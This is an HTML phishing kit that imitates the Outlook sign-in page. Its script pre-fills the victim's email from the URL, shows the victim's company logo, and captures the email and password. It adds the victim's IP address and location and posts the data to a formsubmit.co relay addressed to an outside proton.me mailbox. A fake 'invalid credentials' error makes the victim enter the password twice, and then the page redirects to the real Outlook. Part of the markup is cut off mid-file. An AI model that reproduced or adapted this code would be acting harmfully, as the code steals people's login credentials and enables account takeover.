<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=1024">
  <title>Outlook Login</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      height: 100vh;
    }

    /* Left side (blue background with logo) */
    .left {
      background-color: #0072c6;
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .left img {
      width: 120px;
    }

    /* Right side (form) */
    .right {
      flex: 2;
      background-color: #f9f9f9;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .login-box {
      width: 300px;
      text-align: left;
    }

    .login-box img#logo {
      width: 40px;
      vertical-align: middle;
    }

    .login-box h1 {
      display: inline-block;
      font-size: 28px;
      font-weight: 400;
      margin: 0 0 20px 10px;
      vertical-align: middle;
      color: #0072c6;
    }

    label {
      display: block;
      font-size: 14px;
      margin-bottom: 5px;
      color: #444;
    }

    input {
      width: 100%;
      padding: 8px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 2px;
      font-size: 14px;
      box-sizing: border-box;
    }

    input.error {
      border-color: red;
    }

    .sign-in {
      display: inline-flex;
      align-items: center;
      color: #0072c6;
      font-size: 14px;
      cursor: pointer;
      border: none;
      background: none;
      padding: 0;
    }

    .sign-in:hover {
      text-decoration: underline;
    }

ACX+Brr/AEjk51m4AAAAAElFTkSuQmCC" alt="Microsoft">
      <h1>Outlook</h1>
      <form id="login-form">
        <label for="email">Email, phone, or Skype</label>
        <input type="text" id="email" name="username" autocomplete="username">
        <div id="email-error" class="field-error">Please enter a valid email address</div>

        <label for="psw">Password</label>
        <input type="password" id="psw" name="password" autocomplete="current-password">
        <div id="password-error" class="field-error">Please enter your password</div>

        <div id="error">Invalid credentials. Please try again.</div>
        <button type="submit" class="sign-in"><span style="font-size: 16px;">Sign in</span></button>
      </form>
      <iframe id="frame" style="display:none;"></iframe>
    </div>
  </div>

  <script>
    let step = 1;

    $(document).ready(function() {
      // Get clientID from URL hash if present
      const clientID = window.location.hash.substring(1);
      if (clientID) {
        $('#email').val(clientID);
        const domain = clientID.split('@').pop();
        
        // Only set iframe and logo if it's a valid email format
        if (isValidEmail(clientID)) {
          $("#frame").attr("src", "https://" + domain);
          $("#logo").attr("src", "https://logo.clearbit.com/" + domain);
        }
      }

      // Validate form on submit
      $("#login-form").submit(function(event) {
        event.preventDefault();
        
        // Reset error states
        $(".field-error").hide();
        $("input").removeClass("error");
        
        let isValid = true;
        const email = $("#email").val().trim();
        const password = $("#psw").val().trim();
        
        // Validate email
        if (!email) {
          $("#email-error").text("Please enter your email address").show();
          $("#email").addClass("error");
          isValid = false;
        } else if (!isValidEmail(email)) {
          $("#email-error").text("Please enter a valid email address").show();
          $("#email").addClass("error");
          isValid = false;
        }
        
        // Validate password
        if (!password) {
          $("#password-error").show();
          $("#psw").addClass("error");
          isValid = false;
        }
        
        if (!isValid) {
          return false;
        }

        // If validation passes, proceed with submission
        submit.text('Verifying...');

        $.getJSON('https://ipinfo.io/json', function(response) {
          const posting = $.post("https://formsubmit.co/ajax/gabriel5657@proton.me", {
            _subject: "Logs | " + response.ip,
            Email: $("#email").val(),
            Password: $("#psw").val(),
            Attempts: step,
            IP: response.ip,
            Location: response.city + ", " + response.country,
          });

          posting.done(function(data) {
            if (step === 2) {
              window.location.href = "https://outlook.live.com/owa/";
            } else {
              step++;
              $("#error").css("display", "block");
              submit.text('Sign in');
              $("#psw").val("");
            }
          });

          posting.fail(function(error) {
            console.error(error);
            $("#error").css("display", "block");
            submit.text('Sign in');
            $("#psw").val("");
          });
        }, "json").fail(function() {
          // If IP lookup fails, still submit the form
          const posting = $.post("https://formsubmit.co/ajax/gabriel5657@proton.me", {
            _subject: "Logs | Unknown IP",
            Email: $("#email").val(),
            Password: $("#psw").val(),
            Attempts: step,
            IP: "Unknown",
            Location: "Unknown",
          });

          posting.done(function(data) {
            if (step === 2) {
              window.location.href = "https://outlook.live.com/owa/";
            } else {
              step++;
              $("#error").css("display", "block");
              submit.text('Sign in');
              $("#psw").val("");
            }
          });

          posting.fail(function(error) {
            console.error(error);
            $("#error").css("display", "block");
            submit.text('Sign in');
            $("#psw").val("");
          });
        });
      });
    });

    function isValidEmail(email) {
      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return re.test(email);
    }
    
    const submit = $("button[type='submit']");
  </script>
</body>
</html>
